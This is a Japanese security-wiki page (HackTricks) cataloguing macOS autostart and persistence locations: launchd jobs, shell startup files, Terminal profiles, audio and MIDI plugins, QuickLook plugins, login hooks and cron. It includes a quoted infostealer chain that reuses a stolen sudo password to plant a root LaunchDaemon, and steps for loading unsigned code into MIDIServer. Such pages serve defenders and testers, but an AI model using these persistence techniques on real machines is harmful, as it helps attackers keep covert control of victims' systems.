# macOS 自動起動

{{#include ../banners/hacktricks-training.md}}

このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) を大いに参考にしています。目的は、ファイルへの書き込みが後のコード実行につながる場所、実行のトリガーとなるイベント、および必要な権限を特定することです。ある場所が存在するからといって、その仕組みが有効であるとは限りません。以下に記載したローカルでの確認は、macOS 26.5.2（2026年10月5日）で実施したものであり、すべてのmacOSリリースでの動作を保証するものではありません。

> [!NOTE]
> 「書き込みをトリガーとする」とは、必ずしも「書き込み直後に実行される」という意味ではありません。ログイン時、特定のアプリケーションの起動時、またはユーザーが操作を行ったときにのみ読み込まれる場所もあります。すでに設定済みのジョブ内にある書き込み可能なペイロードと、新しいジョブを登録する権限も別物です。この手法に頼る前に、使い捨てアカウントまたはVMでテストしてください。

## サンドボックス回避

> [!TIP]
> ここでは、**ファイルに書き込んで**から**待つ**だけで、非常に**一般的な**操作、決められた**時間**の経過、または通常はroot権限なしでサンドボックス内から実行できる**操作**を利用して、何かを実行できる**サンドボックス回避**に有用な自動起動場所を紹介します。

### Launchd

- サンドボックス回避に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/Library/LaunchAgents`**
  - **トリガー**: ユーザーのログイン（または明示的な登録）
  - root権限が必要
- **`/Library/LaunchDaemons`**
  - **トリガー**: システム起動（または明示的な登録）
  - root権限が必要
- **`/System/Library/LaunchAgents`**
  - **トリガー**: ユーザーのログイン。Appleの保護されたシステム領域
- **`/System/Library/LaunchDaemons`**
  - **トリガー**: システム起動。Appleの保護されたシステム領域
- **`~/Library/LaunchAgents`**
  - **トリガー**: 再ログイン

`launchd` がスキャンする `~/Library/LaunchDaemons` という場所はありません。ユーザーごとのジョブは `~/Library/LaunchAgents` に配置します。システムデーモンのディレクトリは `/Library/LaunchDaemons` です。[Appleのlaunchd起動ガイド](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)には、スキャン対象の場所が記載されています。

> [!TIP]
> 興味深いことに、**`launchd`** にはMach-Oセクション `__Text.__config` に埋め込みのプロパティリストがあり、launchdが起動する必要のある、よく知られたサービスが含まれています。さらに、これらのサービスには `RequireSuccess`、`RequireRun`、`RebootOnSuccess` を含めることができ、これは実行され、正常に完了しなければならないことを意味します。
>
> もちろん、コード署名のため変更できません。

#### 説明と悪用

**`launchd`** は、OS Xカーネルによって起動時に実行される**最初の****プロセス**であり、シャットダウン時に終了する最後のプロセスです。常に **PID 1** である必要があります。このプロセスは、次の場所にある **ASEP** **plist** で指定された設定を**読み込み、実行**します。

- `/Library/LaunchAgents`: 管理者がインストールしたユーザーごとのエージェント
- `/Library/LaunchDaemons`: 管理者がインストールしたシステム全体のデーモン
- `/System/Library/LaunchAgents`: Appleが提供するユーザーごとのエージェント
- `/System/Library/LaunchDaemons`: Appleが提供するシステム全体のデーモン

ユーザーがログインすると、`launchd` はそのユーザーの `~/Library/LaunchAgents` にあるplistを、そのユーザーの権限で読み込みます。ジョブは各キーに従って起動されます。plistを読み込んだだけで、プロセスが直ちに実行されるとは限りません。

**エージェントとデーモンの主な違いは、エージェントはユーザーのログイン時に読み込まれ、デーモンはシステム起動時に読み込まれることです**（sshのように、ユーザーがシステムにアクセスする前に実行する必要があるサービスがあるためです）。また、エージェントはGUIを使用できますが、デーモンはバックグラウンドで実行する必要があります。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

各 `ProgramArguments` 要素は個別の引数です。`launchd` は単一の文字列をシェルコマンドとして解析しません。上記の修正版は、読み込まずに `plutil -lint /path/to/example.plist` で構文チェックできます。`ProgramArguments`、`RunAtLoad`、`KeepAlive` については、ローカルの `man launchd.plist` を参照してください。

#### 既存ジョブでのファイルイベントトリガー

**すでに読み込まれている** agent または daemon は、`WatchPaths` を使って、指定したパスが変更されたときに起動できます。`QueueDirectories` はディレクトリが空でない間ジョブを起動し、`StartOnMount` はボリュームのマウント時に起動します。[Appleのlaunchdガイド](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9)には、`WatchPaths` と `QueueDirectories` の例があります。監視対象ファイルへの書き込みでトリガーされるのは、**すでに設定されているジョブ**です。任意のコード実行が可能になるのは、書き込みを行うユーザーが、ジョブの実行ファイル、スクリプト、またはジョブが解釈するデータも制御できる場合に限られます。スキャン対象または登録済みの場所の外に新しい plist を書き込むだけでは、それは読み込まれません。

この自己消去型PoCは、一意の名前を持つ**一時的なユーザーエージェント**を登録し、自身が監視するファイルだけを変更してから、エージェントを削除します。macOS 26.5.2で、ログアウトや再起動なしに正常に実行できました：

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

ローカルで実行すると `watch fired: True` と出力され、`bootout` は成功しました。ここでは、`launchctl bootstrap` は隔離された PoC 内でのみ使用しています。すでにロード済みのジョブには必要ありません。既存のジョブを安全に評価するには、その plist と解決済みの `ProgramArguments` のパスを読み取り、関連する実行ファイルまたはインタープリターで実行されるファイルが、変更を加えずに書き込み可能かどうかを確認します。

**ユーザーのログイン前に実行する必要がある Agent** もあります。これらは **PreLoginAgents** と呼ばれます。たとえば、ログイン時に支援技術を提供する用途に便利です。これらは `/Library/LaunchAgents` にもあります（例は[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)）。

> [!TIP]
> 新しい Daemon または Agent の設定ファイルは、**次回の再起動後、または** `launchctl load <target.plist>` **を実行するとロードされます**。拡張子のない .plist ファイルも `launchctl -F <file>` でロードできます（ただし、これらの plist ファイルは再起動後に自動ロードされません）。\
> `launchctl unload <target.plist>` で**アンロード**することもできます（そのファイルが指定するプロセスは終了します）。
>
> Agent または Daemon の**実行を妨げる**もの（override など）が**何もないことを確認する**には、次を実行します。`sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

現在のユーザーによってロードされているすべての Agent と Daemon を一覧表示します。

```bash
launchctl list
```

#### 悪意のある LaunchDaemon チェーンの例（パスワードの使い回し）

最近の macOS infostealer は、**取得した sudo パスワード**を使い回して、user agent と root LaunchDaemon を配置しました:<sup>[[1]](#references)</sup>

- agent のループを `~/.agent` に書き込み、実行可能にします。
- その agent を指す plist を `/tmp/starter` に生成します。
- 盗んだパスワードを `sudo -S` で使い回し、`/Library/LaunchDaemons/com.finder.helper.plist` にコピーして、所有者を `root:wheel` に設定し、`launchctl load` で読み込みます。
- `nohup ~/.agent >/dev/null 2>&1 &` で出力を切り離し、agent をサイレントに起動します。

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons` に配置された daemon plist は、ユーザー所有にしても安全にはなりません。`launchd` はシステムジョブに適切な所有権と権限を要求し、安全でない plist を拒否する場合があります。root 所有の daemon は、通常、設定で別のアカウントが指定されていない限り root として実行されます。ジョブの `UserName`、`GroupName`、所有権、`launchctl` の診断情報を確認してください。plist の所有者名だけから実行ユーザーを推測しないでください。

#### launchd の詳細

**`launchd`** は、**kernel** から起動される最初のユーザーモードプロセスです。プロセスの起動は**成功**しなければならず、**終了もクラッシュもできません**。一部の**kill シグナル**からも**保護**されています。

`launchd` が最初に行うことの1つは、次のような**daemon**をすべて**起動**することです。

- 実行時刻に基づく**タイマー daemon**:
  - macOS 26.5.2 では、`com.apple.atrun.plist` は `StartInterval = 30` 秒で `/usr/libexec/atrun` を起動します。有効状態は、launchd が overrides を plist の `Disabled` キーとは別に保持するため、そのキーの値と異なる場合があります。
  - `/usr/lib/cron/tabs` にジョブがある場合、`com.vix.cron.plist` は `/usr/sbin/cron` を起動します。`com.apple.systemstats.daily` は別のスケジュールサービスであり、cron daemon ではありません。
- 次のような**ネットワーク daemon**:
  - `org.cups.cups-lpd`: TCP（`SockType: stream`）で `SockServiceName: printer` を待ち受けます
    - SockServiceName には、ポートまたは `/etc/services` に記載されたサービスを指定する必要があります
  - `com.apple.xscertd.plist`: TCP のポート 1640 で待ち受けます
- 指定されたパスが変更されたときに実行される**パス daemon**:
  - `com.apple.postfix.master`: パス `/etc/postfix/aliases` を監視します
- **IOKit 通知 daemon**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port**:
  - `com.apple.xscertd-helper.plist`: `MachServices` エントリで `com.apple.xscertd.helper` という名前を指定しています
- **UserEventAgent**:
  - これは前述のものとは異なります。特定のイベントに応じて、launchd にアプリを起動させます。ただし、この場合に関わるメインバイナリは `launchd` ではなく `/usr/libexec/UserEventAgent` です。SIP によって制限されたフォルダ `/System/Library/UserEventPlugins/` からプラグインを読み込みます。各プラグインは、`XPCEventModuleInitializer` キー、または古いプラグインの場合は `Info.plist` の `FB86416D-6164-2070-726F-70735C216EC0` キーに対応する `CFPluginFactories` dict で初期化関数を指定します。

### shell 起動ファイル

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - ただし、これらのファイルを読み込む shell を実行する TCC bypass 対応アプリを見つける必要があります

#### 場所

- **`~/.zshenv`**（または新しいコンパイル済みファイル **`~/.zshenv.zwc`**）
  - **Trigger**: 非対話型の `zsh -c` を含む、通常の zsh 起動時。`zsh -f` はユーザーの起動ファイルを読み込みません。
- **`~/.zshrc`**
  - **Trigger**: 対話型 zsh の起動時。
- **`~/.zprofile`、`~/.zlogin`**
  - **Trigger**: login zsh の起動時。それぞれ `.zshrc` の前後に読み込まれます。
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
  - **Trigger**: zsh でターミナルを開いたとき
  - root が必要
- **`~/.zlogout`**
  - **Trigger**: login zsh が正常終了したとき。すべてのターミナルや shell の終了時に実行されるわけではありません。
- **`/etc/zlogout`**
  - **Trigger**: zsh でターミナルを終了したとき
  - root が必要
- その他については **`man zsh`** を参照
- **`~/.bashrc`**
  - **Trigger**: 対話型の**非 login** Bash を起動したとき。対話型 login Bash は、login ファイルから明示的に読み込まれる場合にのみ実行します。
- **`~/.bash_profile`、`~/.bash_login`、`~/.profile`**
  - **Trigger**: login Bash の起動時。順番に、最初に読み込み可能なファイルが実行されます。それより前のファイルが存在する場合、`~/.profile` は読み込まれません。
- **`/etc/profile`**
  - **Trigger**: login Bash の起動時。変更には root が必要です。
- **`~/.tcshrc`** または、存在しない場合は **`~/.cshrc`**
  - **Trigger**: この Mac では、非対話型の `tcsh -c` を含む `tcsh` の起動時。ユーザーが実際に `tcsh` を実行する必要があります。macOS のデフォルト shell ではありません。
- **`~/.login`**
  - **Trigger**: rc ファイルの読み込み後、login `tcsh` の起動時。
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Trigger**: xterm で実行されると想定されますが、**インストールされていません**。また、インストール後も次のエラーが発生します: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 説明と Exploitation

`zsh` や `bash` などの shell 環境を開始すると、**特定の起動ファイルが実行されます**。現在、macOS のデフォルト shell は `/bin/zsh` です。Terminal や SSH が login shell または対話型 shell を起動するかどうかは、それぞれの設定によります。すべてのセッションで上記のファイルが実行されるとは限りません。macOS には `bash` と `sh` もありますが、使用するには明示的に実行する必要があります。<sup>[[2]](#references)</sup> [zsh 起動ファイルのリファレンス](https://zsh.sourceforge.io/Doc/Release/Files.html)には、読み込み順序、`ZDOTDIR` による上書き、`.zwc` のルールが記載されています。

macOS 26.5.2 で、使い捨ての `ZDOTDIR` を使用して読み取り専用の実験を行いました。この実験では、どのユーザーファイルが読み込まれるかを確認しました。実際の shell 起動ファイルは変更していません。

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

観測された順序は `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout` でした。`ZDOTDIR` は代替ディレクトリを指すよう、あらかじめ設定されている必要があります。任意のディレクトリにファイルを書き込むだけでは不十分です。

[Bash の起動ファイルに関するリファレンス](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)では、login shell と interactive shell が区別されています。macOS 26.5.2 のテストマシンで、4つすべてのユーザー起動ファイルを含む分離された `HOME` を使用したところ、次の結果になりました: `bash -c` → なし、`bash -ic` → `.bashrc`、`bash -lc` と `bash -lic` → `.bash_profile` のみ。`.bash_profile` を削除すると、login Bash は `.bash_login` を読み込み、それも削除すると `.profile` を読み込みました。`BASH_ENV` を設定すると noninteractive Bash にファイルを読み込ませられますが、この環境変数は呼び出し元のプロセスですでに設定されている必要があります。login Bash から明示的に `exit` すると、`~/.bash_logout` も読み込まれることがあります。

ローカルの `tcsh(1)` のマニュアルには、独自の起動順序が記載されています。使い捨ての `HOME` では、`/bin/tcsh -c :` は `.tcshrc` を読み込み、`.tcshrc` がない場合は `.cshrc` を読み込みました。使い捨ての login `tcsh` は `.tcshrc` と `.login` を読み込みました。これらの確認では、一時ファイルのみを作成・削除しました。

### 再度開かれるアプリケーション

> [!CAUTION]
> 指定された設定を行ってログアウトして再度ログインしても、あるいは再起動しても、テストではアプリは実行されませんでした。これらの操作を行う際、アプリが起動中である必要があるかもしれません。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandbox のバイパスに有効: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **トリガー**: 再起動時にアプリケーションを再度開く

#### 説明と悪用

再度開くすべてのアプリケーションは、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります<sup>[[4]](#references)</sup>

そのため、再度開くアプリケーションに自分のものを起動させるには、**自分のアプリをリストに追加**するだけです。

UUID は、そのディレクトリを一覧表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で確認できます。

再度開かれるアプリケーションを確認するには、次のようにします:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

このリストに**アプリケーションを追加するには**、次を使用できます:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminalの環境設定

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminalを使うと、そのユーザーのFDA権限を利用できる

#### 場所

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Trigger**: Shell設定に起動コマンドが含まれるprofileを使って、新しいTerminalウィンドウまたはタブを開く

#### 説明と悪用

**`~/Library/Preferences`**には、アプリケーションにおけるユーザーの設定が保存されています。これらの設定の一部には、**他のアプリケーションやスクリプトを実行する**構成を保持できるものがあります。<sup>[[5]](#references)</sup>

たとえば、Terminalでは起動時にコマンドを実行できます。

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、次のようにファイル **`~/Library/Preferences/com.apple.Terminal.plist`** に反映されます。

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

関連するプロファイルに起動コマンドが設定されていて、Terminal がその設定を読み込む場合、そのプロファイルを使った新しいセッションでコマンドを実行できます。[Apple の最新の Terminal ガイド](https://support.apple.com/guide/terminal/trmlshll/mac)には、プロファイルごとの **Shell → Startup** コマンドが記載されています。そのプロファイルを使った新しいセッションを開始せずに Terminal を開くだけでは不十分です。以下の設定変更は、調査用 Mac では実行していません。

以下のように cli から追加できます：

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Other file extensions

- サンドボックスのバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Terminal を使うと、ユーザーの FDA 権限を利用できる

#### Location

- **任意の場所**
  - **Trigger**: 該当する `.terminal`、`.command`、または `.tool` ファイルを開く

#### Description & Exploitation

ユーザーが **`.terminal`** 設定ファイルを開くと、Terminal はそのプロファイルからセッションを作成できます。また、実行可能な **`.command`** ファイルや **`.tool`** ファイルも Terminal で開けます。これは明示的にファイルを開くことがトリガーであり、Terminal を開くだけで実行されるわけではありません。継承される TCC アクセスは、Terminal に実際に付与されている権限と、試みる操作によって異なります。以下の過去の例は、調査用 Mac では実行されていません。

試すには:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

`.command`、`.tool`拡張子も使用できます。通常のシェルスクリプトを記述すれば、これらもTerminalで開かれます。

> [!CAUTION]
> Terminalに**フルディスクアクセス**が許可されている場合、この操作を完了できます（実行されたコマンドはTerminalウィンドウに表示される点に注意してください）。

### オーディオプラグイン

レポート: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
レポート: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - 追加のTCCアクセスを得られる可能性があります

#### 場所

- **`/Library/Audio/Plug-Ins/HAL`**
  - root権限が必要
  - **トリガー**: Core Audio serverが互換性のあるHALデバイスプラグインを読み込みます。serverの再起動によって再検出される場合があります
- **`/Library/Audio/Plug-ins/Components`**
  - root権限が必要
  - **トリガー**: オーディオホストがインストール済みのAudio Unitを検出してインスタンス化します
- **`~/Library/Audio/Plug-ins/Components`**
  - **トリガー**: オーディオホストがインストール済みのAudio Unitを検出してインスタンス化します
- **`/System/Library/Components`**
  - Apple提供のシステム保護された場所
  - **トリガー**: オーディオホストが一致するシステムコンポーネントをインスタンス化します

#### 説明

先述のレポートによると、一部のオーディオプラグインを**コンパイル**して読み込ませることが可能です。<sup>[[6]](#references)[[7]](#references)</sup>

HALデバイスプラグインとAudio Unitは、異なる読み込み経路を使用します。[AppleのAudio Unitホスティングガイド](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html)によると、ホストはコンポーネントを検出してインスタンス化する必要があります。スキャンディレクトリにコピーしたり、`coreaudiod`を再起動したりするだけでは、実行された証拠にはなりません。AUv2プラグインはホストプロセス内で実行されますが、[Appleの最新のAudio Unitガイダンス](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments)によると、macOSではAUv3はデフォルトで別プロセスで実行されます。署名、sandbox、ライブラリ検証の制約はホストによって異なります。調査用Macでは、オーディオプラグインのインストールも実行も行っていません。

### CoreMIDIドライバ（MIDIServer）

レポート: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - コードはアプリのsandboxではなく、`MIDIServer`プロセス内で実行されます
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer`は独自の`seatbelt` sandboxプロファイルで実行されます

#### 場所

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - root権限不要（ユーザーが書き込み可能）
  - **トリガー**: `MIDIServer`の起動または再起動。いずれかのプロセスが初めてCoreMIDIを使用すると、オンデマンドで起動されます（*Audio MIDI設定*、GarageBand、DAW、またはWebMIDIを使用するページを開くなど）
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - root権限が必要
  - **トリガー**: 上記と同じ

#### 説明とExploit

Appleの`MIDIServer`（`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`）は、`Audio/MIDI Drivers`ディレクトリからMIDI **ドライバ**バンドルを読み込みます。このバイナリはApple署名済みですが、`com.apple.security.cs.disable-library-validation` entitlementが付与されているため、**未署名または別のチームによるad-hoc署名済み**のバンドルを読み込み、root権限なしでApple所有の別プロセス内でコードを実行できます。<sup>[[53]](#references)</sup>

macOS 26で読み取り専用で検証済み:

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

ドライバーは `MIDIDriverInterface` ファクトリーをエクスポートする標準バンドルです。ペイロードをファクトリー／コンストラクターに配置すると、`MIDIServer` がドライバーを列挙した時点で実行されます。ビルドして `~/Library/Audio/MIDI Drivers/Evil.plugin` として配置し、ログアウトや再起動をせずにロードをトリガーします。

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - 追加のTCCアクセスを取得できる場合があります

#### 場所

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明とExploit

QuickLook pluginsは、**ファイルのプレビューを起動**（Finderでファイルを選択してスペースバーを押す）し、そのファイル形式に対応する**pluginがインストールされている**場合に実行されます。<sup>[[8]](#references)</sup>

独自のQuickLook pluginをコンパイルし、前述の場所のいずれかに配置して読み込ませた後、対応するファイルを開いてスペースキーを押し、実行を起動できます。

これらのパスは、旧式の`.qlgenerator`バンドルを指します。[AppleのQuick Lookアーキテクチャガイド](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html)には、検索順序と対応するファイル形式が記載されています。現在のQuick Look **app extensions**はアプリにパッケージされており、登録および実行のルールが異なります。generatorが存在しても、ファイル形式の選択で優先されることや、そのコードがFinder自体で実行されることの根拠にはなりません。旧式のgeneratorパスはドキュメントとディレクトリの存在状況から確認しましたが、調査用Macにはgeneratorはインストールも読み込みもされていませんでした。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> ユーザーのLoginHookでもrootのLogoutHookでも、私の環境では動作しませんでした

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります
  - `~/Library/Preferences/com.apple.loginwindow.plist`に格納されています

これらは非推奨ですが、ユーザーのログイン時にコマンドを実行するために使用できます。<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

この設定は `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` に保存されます。

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

削除するには：

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

root user のものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています

## Conditional Sandbox Bypass

> [!TIP]
> ここでは、ファイルに何かを書き込み、特定の**プログラムがインストールされていること**や、「一般的ではない」ユーザー操作、環境など、あまり一般的でない条件を想定するだけで実行できる **sandbox bypass** に役立つ起動場所を紹介します。

### Cron

**解説**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、`crontab` binary を実行できる必要があります
  - または root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`**
  - 直接書き込むには root が必要です。`crontab <file>` を実行できる場合は root は不要です
  - **Trigger**: インストールされた crontab のスケジュール。`at` と `periodic` は以下で説明する別の仕組みです。

#### Description & Exploitation

**現在のユーザー**の cron jobs を一覧表示するには:

```bash
crontab -l
```

システムの cron デーモンの launchd plist には、`/usr/lib/cron/tabs` を指定する `QueueDirectories` エントリがあります。インストール済みのユーザー crontab はここに保存されます。他のユーザーの crontab を調べるには root 権限が必要です。

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

